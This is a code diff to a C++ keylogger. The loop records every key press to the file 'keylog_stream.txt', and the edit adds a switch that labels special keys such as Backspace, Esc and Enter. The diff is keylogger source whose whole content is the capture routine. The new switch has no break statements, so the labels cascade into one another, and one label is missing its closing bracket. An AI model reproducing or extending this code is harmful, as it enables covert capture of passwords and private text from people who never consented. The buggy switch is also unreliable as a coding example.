@@ -19,7 +19,7 @@ void log()
 {
 	char c;
 
-	for(;;) // infinite loop
+	for(;;) // infinite loop - careful
 	{
 		// using ASCII to collect input
 		for(c = 8; c <= 222; c++)
@@ -29,7 +29,16 @@ void log()
 			{
 				// ios::app prevents file rewrite with every key press
 				ofstream write("keylog_stream.txt", ios::app);
-				write << c;
+				// write << c; // commented out to add switch to check keys
+				switch(c)
+				{
+					case 8: write << "<Backspace";
+					case 27: write << "<Esc>";
+					case 127: write << "<DEL>";
+					case 32: write << " ";
+					case 13: write << "<Enter>\n";
+					default: write << c;
+				}
 			}
 		}
 	}
